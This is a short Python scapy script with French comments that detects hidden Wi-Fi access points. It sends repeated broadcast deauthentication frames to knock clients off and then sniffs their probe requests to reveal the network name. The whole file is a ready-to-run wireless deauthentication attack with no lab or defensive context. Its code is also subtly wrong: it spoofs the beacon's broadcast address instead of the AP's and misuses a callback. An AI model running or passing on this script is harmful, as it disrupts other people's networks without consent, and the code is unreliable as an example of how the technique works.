from scapy.all import *

import datetime 

def probe_request(pkt):

    if pkt.haslayer(Dot11ProbeReq): # Vérifie si le paquet contient une couche Dot11ProbeReq (requête de sonde)

        if pkt.addr2 in a: # Vérifie si l'adresse MAC de la station qui a envoyé la requête est dans la liste a

            print("SSID found: " + pkt.info.decode() + " at " + str(datetime.datetime.now())) # Affiche le nom du réseau et l'heure à laquelle la requête a été reçue

 
a=[]

def hidden_ap_discovery(pkt):

    if pkt.haslayer(Dot11Beacon): # Vérifie si le paquet contient une couche Dot11Beacon (balise)

        if not pkt.info: # Vérifie si le paquet ne contient pas d'informations sur le réseau (c'est-à-dire s'il s'agit d'un réseau caché)

            t = datetime.datetime.today() # Récupère la date et l'heure actuelles
            a.append(pkt.addr1) # Ajoute l'adresse MAC de l'AP à la liste a
            print("Hidden AP discovered: " + pkt.addr2 + " at " + str(datetime.datetime.now())) # Affiche l'adresse MAC de l'AP et l'heure à laquelle il a été découvert
            print("trying to reveal SSID...")

            # Envoie un paquet de déauthentification (deauth) à l'AP pour tenter de révéler le SSID
            sendp(RadioTap()/Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=pkt.addr1, addr3=pkt.addr1)/Dot11Deauth(), iface="wlan0mon", count=10, inter=0.100)

            # Écoute les requêtes de sonde (probe request) pour cet AP
            sniff(prn=probe_request(pkt), iface="wlan0mon", count=50)


            

sniff(prn=hidden_ap_discovery, iface="wlan0mon", count=0) # Capturer les paquets en mode promiscuous sur l'interface réseau wlan0mon, en appelant la fonction hidden_ap_discovery pour chaque paquet capturé. Le paramètre count est défini à 0 pour capturer les paquets indéfiniment jusqu'à ce que le script soit arrêté manuellement.
